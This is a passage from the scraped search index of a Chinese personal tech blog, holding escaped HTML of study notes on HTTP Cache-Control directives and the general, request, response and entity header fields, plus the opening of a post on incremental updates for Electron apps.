&lt;h3 id=&#34;must-revalidate&#34;&gt;must-revalidate&lt;/h3&gt;
&lt;p&gt;使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。&lt;/p&gt;
&lt;p&gt;若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。&lt;/p&gt;
&lt;p&gt;另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: must-revalidate
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;proxy-revalidate&#34;&gt;proxy-revalidate&lt;/h3&gt;
&lt;p&gt;proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: proxy-revalidate
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;no-transform&#34;&gt;no-transform&lt;/h3&gt;
&lt;p&gt;有时为了提高性能，缓存或代理会有压缩图片等类似操作&lt;/p&gt;
&lt;p&gt;使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。&lt;br&gt;
这样做可防止缓存或代理压缩图片等类似操作&lt;/p&gt;
&lt;h2 id=&#34;浏览器缓存机制&#34;&gt;浏览器缓存机制&lt;/h2&gt;
&lt;p&gt;以下总结自&lt;a href=&#34;https://blog.csdn.net/kkdelta/article/details/100576096&#34;&gt;网络&lt;/a&gt;，以后确认具体过程。&lt;/p&gt;
&lt;p&gt;1、当前缓存是否过期？2、服务器中的文件是否可用？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一步：判断当前缓存是否过期&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;浏览器请求server.js文件，&lt;/p&gt;
&lt;p&gt;假如文件还在缓存有效期内，则直接使用缓存，不会重新发起请求。&lt;/p&gt;
&lt;p&gt;假如文件缓存过期，则重新发起请求。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二步：判断服务器中的文件是否可用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;服务器判断请求的server.js文件是否在缓存有效期内，若有效，则返回响应头304，浏览器直接使用过期缓存；&lt;/p&gt;
&lt;p&gt;若文件已过期，服务器判断文件是否有改动，无改动，则返回响应头304，浏览器直接使用过期缓存；&lt;/p&gt;
&lt;p&gt;若文件有改动，则返回200，并返回新文件。&lt;/p&gt;
&lt;h2 id=&#34;cache-control使用图解&#34;&gt;cache-control使用图解&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1626740943823.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;目前仍有的疑问&#34;&gt;目前仍有的疑问&lt;/h2&gt;
&lt;p&gt;1、缓存总时长为max-age和max-stale叠加，取值为相加值，还是最大值？&lt;/p&gt;
&lt;p&gt;2、must-revalidate和proxy-revalidate区别？&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.keycdn.com/support/cache-control&#34;&gt;Cache-Control - How to Properly Configure It&lt;/a&gt;&lt;/p&gt;
">66-http-17-通用首部字段Cache-Control</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-tong-yong-shou-bu-zi-duan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;通用首部字段是指，请求报文和响应报文双方都会使用的首部。&lt;/p&gt;
&lt;h2 id=&#34;列表&#34;&gt;列表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;通用首部&lt;/th&gt;
&lt;th&gt;作用（请求报文和响应报文都可能使用）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Cache-Control&lt;/td&gt;
&lt;td&gt;控制缓存的行为&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Connection&lt;/td&gt;
&lt;td&gt;管理持久连接：决定当前的事务完成后，是否会关闭网络连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Date&lt;/td&gt;
&lt;td&gt;创建报文时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pragma&lt;/td&gt;
&lt;td&gt;兼容HTTP/1.0字段：只用于请求报文，客户端要求中间服务器不返回缓存的资源&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Trailer&lt;/td&gt;
&lt;td&gt;允许发送方在分块发送的消息后面添加额外的元信息，常用于分块传输编码中。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Transfer-Encoding&lt;/td&gt;
&lt;td&gt;规定了传输报文主体时采用的编码方式：&lt;code&gt;chunked&lt;/code&gt;分块传输&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Upgrade&lt;/td&gt;
&lt;td&gt;要求客户端使用的升级协议，需配合&lt;code&gt;Connection: Upgrade&lt;/code&gt;一起使用：&lt;code&gt;websocket&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Via&lt;/td&gt;
&lt;td&gt;代理服务器相关信息，每经过一个代理服务器就会添加相关信息，用逗号分割&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Warning&lt;/td&gt;
&lt;td&gt;缓存相关问题的警告&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;cache-control&#34;&gt;Cache-Control&lt;/h3&gt;
&lt;p&gt;可缓存性&lt;/p&gt;
&lt;p&gt;&lt;code&gt;public&lt;/code&gt;（客户端、代理服务器都可利用缓存）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;private&lt;/code&gt;（发起请求的浏览器才可以缓存,代理服务器不可用缓存）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;no-cache&lt;/code&gt;（本地可以用使用缓存，但需要服务器验证后才能使用）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;no-store&lt;/code&gt;（不做任何缓存）&lt;/p&gt;
&lt;p&gt;到期&lt;/p&gt;
&lt;p&gt;&lt;code&gt;max-age=200&lt;/code&gt;（服务器缓存到期时间， 秒）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;s-maxage=200&lt;/code&gt; (代理服务器缓存的到期时间， 秒)&lt;/p&gt;
&lt;h3 id=&#34;connection&#34;&gt;Connection&lt;/h3&gt;
&lt;p&gt;管理持久连接：决定当前的事务完成后，是否会关闭网络连接。&lt;/p&gt;
&lt;p&gt;Http协议1.1之后默认都是keep-alive（持久连接），1.0则是close（非持久连接）。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connection: keep-alive
Connection: close
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;date&#34;&gt;Date&lt;/h3&gt;
&lt;p&gt;表明创建 HTTP 报文的日期和时间。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Date: Tue, 03 Jul 2012 04:40:59 GMT
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pragma&#34;&gt;Pragma&lt;/h3&gt;
&lt;p&gt;Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。&lt;/p&gt;
&lt;p&gt;规范定义的形式唯一，如下所示。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Pragma: no-cache
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。&lt;/p&gt;
&lt;p&gt;所有的中间服务器如果都能以 HTTP/1.1 为基准，那直接采用 CacheControl: no-cache 指定缓存的处理方式是最为理想的。但要整体掌握全部中间服务器使用的 HTTP 协议版本却是不现实的。因此，发送的请求会同时含有下面两个首部字段。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: no-cache
Pragma: no-cache
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;trailer&#34;&gt;Trailer&lt;/h3&gt;
&lt;p&gt;首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Tue, 03 Jul 2012 04:40:56 GMT
Content-Type: text/html
...
Transfer-Encoding: chunked
Trailer: Expires
...(报文主体)...
0
Expires: Tue, 28 Sep 2004 23:59:59 GMT
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。&lt;/p&gt;
&lt;h3 id=&#34;transfer-encoding&#34;&gt;Transfer-Encoding&lt;/h3&gt;
&lt;p&gt;规定了传输报文主体时采用的编码方式。&lt;/p&gt;
&lt;p&gt;HTTP/1.1 的传输编码方式仅对分块传输编码有效。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Tue, 03 Jul 2012 04:40:56 GMT
Cache-Control: public, max-age=604800
Content-Type: text/javascript; charset=utf-8
Expires: Tue, 10 Jul 2012 04:40:56 GMT
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Encoding: gzip
Transfer-Encoding: chunked
Connection: keep-alive
cf0 ←16进制(10进制为3312)
...3312字节分块数据...
392 ←16进制(10进制为914)
...914字节分块数据...
0
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;upgrade&#34;&gt;Upgrade&lt;/h3&gt;
&lt;p&gt;首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /index.htm HTTP/1.1
Upgrade: TLS/1.0
Connection: Upgrade
------------------&amp;gt;
&amp;lt;------------------
HTTP/1.1 101 Switching Protocols
Upgrade: TLS/1.0, HTTP/1.1
Connection: Upgrade
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。&lt;/p&gt;
&lt;p&gt;对于附有首部字段 Upgrade 的请求，服务器可用 101 Switching Protocols 状态码作为响应返回。&lt;/p&gt;
&lt;h3 id=&#34;via&#34;&gt;Via&lt;/h3&gt;
&lt;p&gt;使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。&lt;/p&gt;
&lt;p&gt;报文经过代理或网关时，会先在首部字段 Via 中附加该服务器的信息，然后再进行转发。&lt;/p&gt;
&lt;p&gt;首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;客户端: 
GET / HTTP/1.1

代理服务器A: 
GET / HTTP/1.1
Via: 1.0 gw.hackr.jp (Squid/3.1)

代理服务器B:
GET / HTTP/1.1
Via: 1.0 gw.hackr.jp (Squid/3.1), 1.1 a1.example.net(Squid/2.7)

源服务器
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上图用例中，在经过代理服务器 A 时，Via 首部附加了“1.0 gw.hackr.jp (Squid/3.1)”这样的字符串值。行头的 1.0 是指接收请求的97服务器上应用的 HTTP 协议版本。接下来经过代理服务器 B 时亦是如此，在 Via 首部附加服务器信息，也可增加 1 个新的 Via 首部写入服务器信息。&lt;/p&gt;
&lt;p&gt;Via 首部是为了追踪传输路径，所以经常会和 TRACE 方法一起使用。比如，代理服务器接收到由 TRACE 方法发送过来的请求（其中Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况下，代理服务器会将自身的信息附加到 Via 首部后，返回该请求的响应。&lt;/p&gt;
&lt;h3 id=&#34;warning&#34;&gt;Warning&lt;/h3&gt;
&lt;p&gt;用于告知用户一些与缓存相关的问题的警告。&lt;/p&gt;
&lt;p&gt;Warning 首部的格式如下。最后的日期时间部分可省略。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Warning: [警告码][警告的主机:端口号]“[警告内容]”([日期时间])
Warning: 112 gw.hacker.jp:8080  &amp;quot;cache down&amp;quot; &amp;quot; Wed, 21 Oct 2015 07:28:00 GMT&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;警告码表&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;警告码&lt;/th&gt;
&lt;th&gt;警告内容&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;110&lt;/td&gt;
&lt;td&gt;Response is stale&lt;/td&gt;
&lt;td&gt;响应已过期：由缓存服务器提供的响应已过期（设置的失效时间已过）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;111&lt;/td&gt;
&lt;td&gt;Revalidation failed&lt;/td&gt;
&lt;td&gt;再验证失败：由于无法访问服务器，响应验证失败。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;112&lt;/td&gt;
&lt;td&gt;Disconnection operation&lt;/td&gt;
&lt;td&gt;断开连接操作：缓存服务器断开连接。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;113&lt;/td&gt;
&lt;td&gt;Heuristic expiration&lt;/td&gt;
&lt;td&gt;试探性过期：响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;199&lt;/td&gt;
&lt;td&gt;Miscellaneous warning&lt;/td&gt;
&lt;td&gt;杂项警告：任意的警告内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;214&lt;/td&gt;
&lt;td&gt;Transformation applied&lt;/td&gt;
&lt;td&gt;使用了转换：由代理服务器添加，如果它对返回的展现内容进行了任何转换，比如改变了内容编码、媒体类型等。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;299&lt;/td&gt;
&lt;td&gt;Miscellaneous persistent warning&lt;/td&gt;
&lt;td&gt;持久杂项警告：任意的警告内容&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
">65-http-16-通用首部字段</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-shou-bu-zi-duan/"" data-c="
          &lt;h2 id=&#34;http-首部字段结构&#34;&gt;HTTP 首部字段结构&lt;/h2&gt;
&lt;p&gt;HTTP 首部字段是由首部字段名和字段值构成的，中间用冒号“:” 分&lt;br&gt;
隔。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;首部字段名: 字段值
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例如，在 HTTP 首部中以 Content-Type 这个字段来表示报文主体的 对&lt;br&gt;
象类型。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Content-Type: text/html
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就以上述示例来看，首部字段名为 Content-Type，字符串 text/html 是&lt;br&gt;
字段值。&lt;br&gt;
另外，字段值对应单个 HTTP 首部字段可以有多个值，如下所示。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Keep-Alive: timeout=15, max=100
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-种-http-首部字段类型&#34;&gt;4 种 HTTP 首部字段类型&lt;/h2&gt;
&lt;p&gt;HTTP 首部字段根据实际用途被分为以下 4 种类型。&lt;/p&gt;
&lt;h3 id=&#34;1-通用首部字段general-header-fields&#34;&gt;1、通用首部字段（General Header Fields）&lt;/h3&gt;
&lt;p&gt;请求报文和响应报文两方都会使用的首部。&lt;/p&gt;
&lt;h3 id=&#34;2-请求首部字段request-header-fields&#34;&gt;2、请求首部字段（Request Header Fields）&lt;/h3&gt;
&lt;p&gt;从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。&lt;/p&gt;
&lt;h3 id=&#34;3-响应首部字段response-header-fields&#34;&gt;3、响应首部字段（Response Header Fields）&lt;/h3&gt;
&lt;p&gt;从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。&lt;/p&gt;
&lt;h3 id=&#34;4-实体首部字段entity-header-fields&#34;&gt;4、实体首部字段（Entity Header Fields）&lt;/h3&gt;
&lt;p&gt;针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。&lt;/p&gt;
&lt;h2 id=&#34;http11-首部字段一览&#34;&gt;HTTP/1.1 首部字段一览&lt;/h2&gt;
&lt;h3 id=&#34;通用首部字段&#34;&gt;通用首部字段&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Cache-Control&lt;/td&gt;
&lt;td&gt;控制缓存的行为&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Connection&lt;/td&gt;
&lt;td&gt;逐跳首部、连接的管理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Date&lt;/td&gt;
&lt;td&gt;创建报文的日期时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pragma&lt;/td&gt;
&lt;td&gt;报文指令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Trailer&lt;/td&gt;
&lt;td&gt;报文末端的首部一览&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Transfer-Encoding&lt;/td&gt;
&lt;td&gt;指定报文主体的传输编码方式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Upgrade&lt;/td&gt;
&lt;td&gt;升级为其他协议&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Via&lt;/td&gt;
&lt;td&gt;代理服务器的相关信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Warning&lt;/td&gt;
&lt;td&gt;错误通知&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;请求首部字段&#34;&gt;请求首部字段&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Accept&lt;/td&gt;
&lt;td&gt;用户代理可处理的媒体类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Charset&lt;/td&gt;
&lt;td&gt;优先的字符集&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Encoding&lt;/td&gt;
&lt;td&gt;优先的内容编码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Language&lt;/td&gt;
&lt;td&gt;优先的语言（自然语言）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Authorization Web&lt;/td&gt;
&lt;td&gt;认证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Expect&lt;/td&gt;
&lt;td&gt;期待服务器的特定行为&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;From&lt;/td&gt;
&lt;td&gt;用户的电子邮箱地址&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Host&lt;/td&gt;
&lt;td&gt;请求资源所在服务器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Match&lt;/td&gt;
&lt;td&gt;比较实体标记（ETag）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Modified-Since&lt;/td&gt;
&lt;td&gt;比较资源的更新时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-None-Match&lt;/td&gt;
&lt;td&gt;比较实体标记（与 If-Match 相反）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Range&lt;/td&gt;
&lt;td&gt;资源未更新时发送实体 Byte 的范围请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Unmodified-Since&lt;/td&gt;
&lt;td&gt;比较资源的更新时间（与If-Modified-Since相反）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Max-Forwards&lt;/td&gt;
&lt;td&gt;最大传输逐跳数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Proxy-Authorization&lt;/td&gt;
&lt;td&gt;代理服务器要求客户端的认证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Range&lt;/td&gt;
&lt;td&gt;实体的字节范围请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Referer&lt;/td&gt;
&lt;td&gt;对请求中 URI 的原始获取方&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TE&lt;/td&gt;
&lt;td&gt;传输编码的优先级&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;User-Agent HTTP&lt;/td&gt;
&lt;td&gt;客户端程序的信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;响应首部字段&#34;&gt;响应首部字段&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Ranges&lt;/td&gt;
&lt;td&gt;是否接受字节范围请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Age&lt;/td&gt;
&lt;td&gt;推算资源创建经过时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ETag&lt;/td&gt;
&lt;td&gt;资源的匹配信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Location&lt;/td&gt;
&lt;td&gt;令客户端重定向至指定URI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Proxy-Authenticate&lt;/td&gt;
&lt;td&gt;代理服务器对客户端的认证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Retry-After&lt;/td&gt;
&lt;td&gt;对再次发起请求的时机要求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Server HTTP&lt;/td&gt;
&lt;td&gt;服务器的安装信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Vary&lt;/td&gt;
&lt;td&gt;代理服务器缓存的管理信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WWW-Authenticate&lt;/td&gt;
&lt;td&gt;服务器对客户端的认证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;实体首部字段&#34;&gt;实体首部字段&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Allow&lt;/td&gt;
&lt;td&gt;资源可支持的HTTP方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Encoding&lt;/td&gt;
&lt;td&gt;实体主体适用的编码方式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Language&lt;/td&gt;
&lt;td&gt;实体主体的自然语言&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Length&lt;/td&gt;
&lt;td&gt;实体主体的大小（单位：字节）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Location&lt;/td&gt;
&lt;td&gt;替代对应资源的URI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-MD5&lt;/td&gt;
&lt;td&gt;实体主体的报文摘要&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Range&lt;/td&gt;
&lt;td&gt;实体主体的位置范围&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Type&lt;/td&gt;
&lt;td&gt;实体主体的媒体类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Expires&lt;/td&gt;
&lt;td&gt;实体主体过期的日期时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Last-Modified&lt;/td&gt;
&lt;td&gt;资源的最后修改日期时间&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;非-http11-首部字段&#34;&gt;非 HTTP/1.1 首部字段&lt;/h2&gt;
&lt;p&gt;在 HTTP 协议通信交互中使用到的首部字段，不限于 RFC2616 中定义的 47 种首部字段。还有 Cookie、Set-Cookie 和 Content-Disposition等在其他 RFC 中定义的首部字段，它们的使用频率也很高。&lt;/p&gt;
&lt;p&gt;这些非正式的首部字段统一归纳在 RFC4229 HTTP Header Field Registrations 中。&lt;/p&gt;
&lt;h2 id=&#34;end-to-end-首部和-hop-by-hop-首部&#34;&gt;End-to-end 首部和 Hop-by-hop 首部&lt;/h2&gt;
&lt;p&gt;HTTP 首部字段将定义成缓存代理和非缓存代理的行为，分成 2 种类&lt;br&gt;
型。&lt;/p&gt;
&lt;h3 id=&#34;端到端首部end-to-end-header&#34;&gt;端到端首部（End-to-end Header）&lt;/h3&gt;
&lt;p&gt;分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。&lt;/p&gt;
&lt;h3 id=&#34;逐跳首部hop-by-hop-header&#34;&gt;逐跳首部（Hop-by-hop Header）&lt;/h3&gt;
&lt;p&gt;分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提供 Connection 首部字段。&lt;/p&gt;
&lt;p&gt;下面列举了 HTTP/1.1 中的逐跳首部字段。除这 8 个首部字段之外，其他所有字段都属于端到端首部。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Connection&lt;/li&gt;
&lt;li&gt;Keep-Alive&lt;/li&gt;
&lt;li&gt;Proxy-Authenticate&lt;/li&gt;
&lt;li&gt;Proxy-Authorization&lt;/li&gt;
&lt;li&gt;Trailer&lt;/li&gt;
&lt;li&gt;TE&lt;/li&gt;
&lt;li&gt;Transfer-Encoding&lt;/li&gt;
&lt;li&gt;Upgrade&lt;/li&gt;
&lt;/ul&gt;
">64-http-15-首部字段</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/electron-zeng-liang-geng-xin/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;先介绍一下技术构成，项目是完整的vue项目，在现有项目上完成electron打包及更新。&lt;/p&gt;
&lt;p&gt;打包使用的vue-cli-plugin-electron-builder插件，增量更新为具体的代码实现，并没有用到electron-updater。&lt;/p&gt;
&lt;h2 id=&#34;思路&#34;&gt;思路&lt;/h2&gt;
&lt;p&gt;1、比较本地和远程的版本&lt;/p&gt;
&lt;p&gt;本地的版本可以放在一个app.txt文件中，或者通过变量获取。&lt;/p&gt;
&lt;p&gt;远程的版本通过服务端文件（yml或者json）获取&lt;/p&gt;
&lt;p&gt;比较版本，若相同则不更新，返回。&lt;/p&gt;
&lt;p&gt;若不同，则提示更新，或直接进入更新流程&lt;/p&gt;
&lt;p&gt;2、更新流程：通过线上增量包文件地址，进行下载&lt;/p&gt;
&lt;p&gt;3、将zip压缩包解压缩&lt;/p&gt;
&lt;p&gt;4、重新加载&lt;/p&gt;
&lt;h2 id=&#34;详解&#34;&gt;详解&lt;/h2&gt;
&lt;h3 id=&#34;一-vue-cli-plugin-electron-builder&#34;&gt;一、vue-cli-plugin-electron-builder&lt;/h3&gt;
&lt;p&gt;安装vue-cli-plugin-electron-builder&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vue add electron-builder@2.0.0-rc.6
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;版本选择9.0.0&lt;/p&gt;
